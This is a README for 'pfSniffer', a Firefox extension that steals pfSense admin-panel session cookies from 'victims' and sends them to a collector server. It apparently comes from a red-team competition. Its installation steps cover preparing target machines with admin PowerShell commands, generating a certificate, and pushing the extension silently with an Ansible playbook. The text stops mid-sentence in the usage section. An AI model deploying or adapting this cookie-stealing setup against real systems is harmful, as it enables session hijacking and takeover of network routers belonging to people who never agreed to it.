# pfSniffer (pfSense Logger)

## Introduction
Logs pfSense control panel session IDs from the client side
### Firefox Extension UUID
pfsense_logger@bithavenbuffalo.com

## Requirements
- Linux Computer for Ansible Controller
- Windows Computer for Server
    - Server IP must be 192.168.1.9
- Firefox Preinstalled on Victims
- pfSense Router
    - Router IP must be 192.168.1.254
### Note
These IPs will be changed for each comp, and hopefully I will update the README with the new IP requirements, but in the case I don't, check background.js and manifest.json

## Installation

### Step 1: Pre-Ansible Setup (Unneeded if Ansible is already usable)
Run these 2 commands in an **Administrator Powershell** on the target machines

***(New-Object -TypeName System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ansible/ansible-documentation/devel/examples/scripts/ConfigureRemotingForAnsible.ps1", "$env:temp\ConfigureRemotingForAnsible.ps1")***

***powershell.exe -ExecutionPolicy ByPass -File "$env:temp\ConfigureRemotingForAnsible.ps1"***


### Step 2: Certificate Generation
You must generate new cert.pem and key.pem files as my key.pem file is not included in this repository (I'm not that stupid).
I used this command to generate them, it will ask a few questions about location and org info. You don't have to answer anything. Unfortunately due to the nature of the Firefox extension, the server IP must be 192.168.1.9

***openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 365 -subj "//CN=192.168.1.9" -addext "basicConstraints=CA:FALSE" -addext "subjectAltName=IP:192.168.1.9"***

### Step 3: Download to Server/Ansible
Download the *Server* folder to your server, and the *Ansible* folder to your Ansible Controller. These must be different computers because as it stands, the Server must be on Windows, and the Ansible must be on Linux. I hopefully will add Linux support to server later.

Python Requests package must also be installed with:
***pip install Requests***

### Step 4: Run Ansible
You must edit hosts.ini to the IPs of the targets you wish to edit. These targets must all have step 1 performed on them prior to this, simply add a new line under windows with each IP. Then run this command on the Ansible controller, within the *Ansible* folder.

***ansible-playbook -i hosts.ini deploy.yml***

## Usage
Any time the pfSense web GUI is visited or logged into, it will log a PHPSESSID into the Firefox cookies. pfSense Logger will grab this cookie and also send it back to the server, where the server will store it into a sqlite .db file. With each 